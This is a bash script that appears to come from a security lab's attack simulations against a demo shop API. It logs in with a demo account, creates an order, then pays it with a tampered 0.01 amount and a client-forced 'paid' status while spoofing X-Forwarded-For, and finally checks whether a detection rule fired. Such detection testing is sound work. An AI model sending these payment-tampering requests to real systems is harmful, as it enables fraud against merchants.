#!/bin/bash
# 09-business-logic-abuse: create an order, then pay it with a tampered amount
# and a client-supplied order status (VULN-012). Should trip RULE-009.
set -e

DIR="$(cd "$(dirname "${BASH_SOURCE[0]:-$0}")" && pwd)"
. "$DIR/../lib.sh"

title "Attack Sim: Business Logic Abuse (09)"

XFF="$(random_xff)"
log "Using source IP $XFF for this run"

echo ""
log "[1/3] Login as alice.anderson@tenant.alpha.com..."
TOKEN=$(login "alice.anderson@tenant.alpha.com" "demo_password_123" "$XFF")
[ -n "$TOKEN" ] || { err "Login failed"; exit 1; }
ok "Logged in"

echo ""
log "[2/3] Create an order (prod-1 x1)..."
ORDER=$(curl -s -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -H "X-Forwarded-For: $XFF" \
  -d '{"items":[{"productId":"prod-1","quantity":1}]}' \
  "$API/api/orders")
ORDER_ID=$(json_get "$ORDER" "id")
ORDER_TOTAL=$(json_get "$ORDER" "total")
[ -n "$ORDER_ID" ] || { err "Order creation failed: $ORDER"; exit 1; }
ok "Created $ORDER_ID (status=$(json_get "$ORDER" "status"), total=$ORDER_TOTAL)"

echo ""
log "[3/3] Pay with a tampered amount (0.01) and client-forced orderStatus=paid..."
PAY=$(curl -s -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -H "X-Forwarded-For: $XFF" \
  -d "{\"orderId\":\"${ORDER_ID}\",\"status\":\"completed\",\"orderStatus\":\"paid\",\"amount\":0.01}" \
  "$API/api/payments")
ok "POST /api/payments -> order now orderStatus=$(json_get "$PAY" "orderStatus"), paid amount=$(json_get "$PAY" "amount") of real total $ORDER_TOTAL (VULN-012)"

echo ""
run_detection "$XFF"
print_newest_incidents 5

echo ""
title "Business logic abuse simulation complete (source IP $XFF)"
